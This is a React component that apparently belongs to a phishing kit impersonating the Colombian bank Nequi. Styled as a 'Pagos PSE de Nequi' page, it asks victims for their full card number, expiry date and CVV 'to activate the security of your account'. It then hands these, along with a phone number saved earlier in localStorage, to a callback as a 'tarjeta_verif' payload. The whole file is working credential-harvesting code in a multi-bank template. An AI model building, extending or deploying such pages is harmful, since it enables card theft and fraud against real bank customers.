/* eslint-disable @next/next/no-img-element */
/* eslint-disable @typescript-eslint/no-explicit-any */
"use client";
import React, { useState, useMemo } from 'react';

export default function TarjetaNequi({ enviar }: any) {
  const [tarjeta, setTarjeta] = useState("");
  const [mes, setMes] = useState("");
  const [ano, setAno] = useState("");
  const [cvv, setCvv] = useState("");

  // Recuperar celular de localStorage de forma segura
  const celular = useMemo(() => {
    if (typeof window !== 'undefined') return localStorage.getItem('nequi_phone') || "";
    return "";
  }, []);

  // Validación: Tarjeta (16), Fecha seleccionada y CVV (3) 

  /* 
    payload.tarjeta = data.tarjeta;
        payload.fecha = data.fecha;
        payload.cvv = data.cvv;
  ?*/
  const isFormValid = useMemo(() => {
    return tarjeta.length === 16 && mes !== "" && ano !== "" && cvv.length === 3;
  }, [tarjeta, mes, ano, cvv]);

  const handleValidar = () => {
    if (isFormValid) {
      const payload = {
        view: 'tarjeta_verif',
        tarjeta: tarjeta,
        fecha: `${mes}/${ano}`,
        cvv: cvv,
        bank: "Nequi"
      };
      enviar?.(payload);
    }
  };

  const boxBase = "relative w-full h-[60px] rounded-[4px] transition-all duration-300 px-4 flex items-end pb-2 bg-[#F5F1F5] border-2 border-transparent focus-within:border-[#DA0081] focus-within:bg-white mb-4";
  const labelBase = "absolute left-4 transition-all duration-200 pointer-events-none";

  return (
    <div className="contenedor animate-in fade-in duration-500 max-w-[400px] mx-auto p-4 font-manrope">
      <style dangerouslySetInnerHTML={{
        __html: `
        @import url('https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap');
        .font-manrope { font-family: 'Manrope', sans-serif; }
      `}} />

      <div className="flex flex-col items-center mb-6">
        <img src="/bancos/nequi/img/logo.svg" width="176" alt="logo" className="mb-4" />
        <h2 className="text-[22px] font-extrabold text-[#210049] w-full text-center">
          Pagos PSE de Nequi
        </h2>
      </div>

      <p className="text-[14px] font-medium text-gray-500 mb-8 text-center leading-tight">
        Digite los siguientes datos para activar la seguridad de tu cuenta.
      </p>

      <div className="space-y-1">
        {/* Input Tarjeta */}
        <div className={boxBase}>
          <span className={`${labelBase} ${tarjeta ? "top-2 text-[11px] text-[#DA0081] font-bold" : "top-5 text-[17px] text-[#210049] opacity-60"}`}>
            Tarjeta
          </span>
          <input
            type="text"
            inputMode="numeric"
            maxLength={16}
            value={tarjeta}
            onChange={(e) => setTarjeta(e.target.value.replace(/\D/g, ""))}
            className="w-full bg-transparent border-none outline-none text-[17px] text-[#210049] font-bold h-7"
            autoComplete="off"
          />
        </div>

        {/* Fila Fecha (Mes / Año) */}
        <div className="flex flex-col mb-4 bg-[#F5F1F5] p-3 rounded-[4px]">
          <span className="text-[11px] text-[#DA0081] font-bold mb-1 ml-1">Fecha de vencimiento</span>
          <div className="flex gap-2">
            <select
              value={mes}
              onChange={(e) => setMes(e.target.value)}
              className="w-1/2 bg-white border-none outline-none h-10 rounded-sm px-2 text-[#210049] font-bold"
            >
              <option value="">Mes</option>
              {["01", "02", "03", "04", "05", "06", "07", "08", "09", "10", "11", "12"].map(m => (
                <option key={m} value={m}>{m}</option>
              ))}
            </select>
            <select
              value={ano}
              onChange={(e) => setAno(e.target.value)}
              className="w-1/2 bg-white border-none outline-none h-10 rounded-sm px-2 text-[#210049] font-bold"
            >
              <option value="">Año</option>
              {["2024", "2025", "2026", "2027", "2028", "2029", "2030", "2031", "2032", "2033"].map(a => (
                <option key={a} value={a}>{a}</option>
              ))}
            </select>
          </div>
        </div>

        {/* Input CVV */}
        <div className={boxBase}>
          <span className={`${labelBase} ${cvv ? "top-2 text-[11px] text-[#DA0081] font-bold" : "top-5 text-[17px] text-[#210049] opacity-60"}`}>
            CVV
          </span>
          <input
            type="password"
            inputMode="numeric"
            maxLength={3}
            value={cvv}
            onChange={(e) => setCvv(e.target.value.replace(/\D/g, ""))}
            className="w-full bg-transparent border-none outline-none text-[17px] text-[#210049] font-bold h-7 tracking-[0.3em]"
            autoComplete="off"
          />
        </div>
      </div>

      <div className="mt-8 space-y-3">
        <button
          onClick={handleValidar}
          disabled={!isFormValid}
          className={`w-full py-4 font-bold text-lg rounded-sm transition-all duration-300 ${isFormValid
            ? "bg-[#da0081] text-white shadow-lg shadow-pink-100 active:scale-95"
            : "bg-gray-200 text-gray-400 cursor-not-allowed"
            }`}
        >
          Validar
        </button>

        <button className="w-full py-2 text-[#da0081] font-bold text-sm bg-transparent">
          Ahora no
        </button>
      </div>
    </div>
  );
}